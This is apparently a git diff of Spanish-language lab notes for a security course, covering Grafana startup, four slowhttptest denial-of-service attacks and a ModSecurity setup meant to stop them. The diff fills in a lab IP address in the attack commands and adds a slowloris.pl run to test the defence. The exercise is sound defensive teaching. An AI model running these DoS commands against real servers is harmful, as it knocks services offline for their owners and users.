@@ -1544,6 +1544,7 @@ sudo apt-get install -f
 Iniciar grafana:
 ```
 /bin/systemctl start grafana-server
+systemctl start grafana-server
 ```
 
 Grafana corre en el puerto 3000. Podemos acceder a él en: **http://10.11.48.202:3000**
@@ -2422,7 +2423,7 @@ o se queda colgado.
 Ejemplos de los ataques:
 ```bash
 #SlowLoris Mode:  Envía las cabeceras sin línea vacía de forma que el servidor espere eternamente
-slowhttptest -c 1000 -H -g -o slowloris_stats -i 10 -r 200 -t GET -u http://IP_VICTIMA -x 24 -p 3
+slowhttptest -c 1000 -H -g -o slowloris_stats -i 10 -r 200 -t GET -u http://10.11.48.175 -x 24 -p 3
 
     -H → SlowLoris: Envía cabeceras incompletas
 
@@ -2435,7 +2436,7 @@ slowhttptest -c 1000 -H -g -o slowloris_stats -i 10 -r 200 -t GET -u http://IP_V
     -p 3 → 3 segundos de timeout de conexión
 
 #Slow POST Mode: Reserva espacio para muchas consultas y las mantiene abiertas enviando datos lentamente
-slowhttptest -c 1000 -B -g -o slowpost_stats -i 110 -r 200 -s 8192 -t POST -u http://IP_VICTIMA -x 10 -p 3
+slowhttptest -c 1000 -B -g -o slowpost_stats -i 110 -r 200 -s 8192 -t POST -u http://10.11.48.175 -x 10 -p 3
     -B → Slow POST: Anuncia cuerpo grande pero envía lento
 
     -s 8192 → 8KB de Content-Length anunciado
@@ -2445,7 +2446,7 @@ slowhttptest -c 1000 -B -g -o slowpost_stats -i 110 -r 200 -s 8192 -t POST -u ht
     -t POST → Usa método POST
 
 # Apache Killer Mode - Basado en rangos
-slowhttptest -c 500 -R -g -o apachekiller_stats -r 100 -t GET -u http://IP_VICTIMA -x 10 -p 2
+slowhttptest -c 500 -R -g -o apachekiller_stats -r 100 -t GET -u http://10.11.48.175 -x 10 -p 2
 
 	-R → Range Attack: Envía múltiples cabeceras Range
 	
@@ -2458,7 +2459,7 @@ slowhttptest -c 500 -R -g -o apachekiller_stats -r 100 -t GET -u http://IP_VICTI
 	-p 2 → 2 segundos timeout (corto para reconexión rápida
 
 # SlowRead Mode: # Lectura lenta de respuestas con ventana TCP pequeña
-slowhttptest -c 1000 -X -g -o slowread_stats -r 200 -w 512 -y 1024 -n 5 -z 32 -u http://IP_VICTIMA -p 3
+slowhttptest -c 1000 -X -g -o slowread_stats -r 200 -w 512 -y 1024 -n 5 -z 32 -u http://10.11.48.175 -p 3
 
     -X → SlowRead: Lee respuestas muy lentamente
 
@@ -2478,9 +2479,81 @@ slowhttptest -c 1000 -X -g -o slowread_stats -r 200 -w 512 -y 1024 -n 5 -z 32 -u
 
 ### **Apartado m) Instale y configure modsecurity. Vuelva a proceder con el ataque del apartado anterior. ¿Qué acontece ahora?**
 
-> Actualizar todos los módulos de ModSecurity. Nos va mandar realizar ataques sin él primero y ver que nadie defiende. Si ahora atacamos cn ModSecurity activado la máquina si que deberñia defenderse. 
+> Actualizar todos los módulos de ModSecurity. Nos va mandar realizar ataques sin él primero y ver que nadie defiende. Si ahora atacamos cn ModSecurity activado la máquina si que deberia defenderse. 
 
 > Tienes que defenderse de los 4 ataques posibles que damos!!! En la defensa no probará todos, solo alguno
+
+
+1-Instalar el paquete:
+
+```bash
+apt install libapache2-mod-security2 -y
+```
+
+2. Activar el módulo:
+```bash
+a2enmod security2
+```
+
+3. Reiniciar Apache:
+```bash
+systemctl restart apache2
+```
+
+4. Verificar que está activo:
+```bash
+apache2ctl -M | grep security
+```
+
+Ahora debería mostrar: security2_module
+
+5. Configurar ModSecurity:
+```bash
+# Copiar configuración recomendada
+cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf
+
+# Editar para modo activo
+nano /etc/modsecurity/modsecurity.conf
+```
+
+6. Cambiar esta línea:
+```bash
+
+# Buscar y cambiar:
+SecRuleEngine DetectionOnly
+# Por:
+SecRuleEngine On
+
+# Abajo del todo:
+SecConnEngine On
+SecConnWriteStateLimit 40
+SecConnReadStateLimit 40
+```
+7. Reiniciar nuevamente:
+```bash
+systemctl restart apache2
+```
+
+Verificación final:
+```bash
+
+# Debe mostrar security2_module
+apache2ctl -M | grep security
+
+# Probar que Apache sigue funcionando
+curl -I http://localhost/
+```
+
+Ahora probar los ataques del apartado anterior:
+```bash
+
+# Ejecutar Slowloris por ejemplo
+perl slowloris.pl -dns 10.11.48.175 -port 80 -num 100
+
+# En otra terminal, ver logs
+tail -f /var/log/apache2/error.log
+tail -f /var/log/apache2/access.log
+```
 
 <br>
 <br>
@@ -2884,6 +2957,7 @@ Una vez que OSSEC funciona, hacer un flush de OSSEC y veremos todo en pantalla. 
 
 
 <br>
+
 
 
 
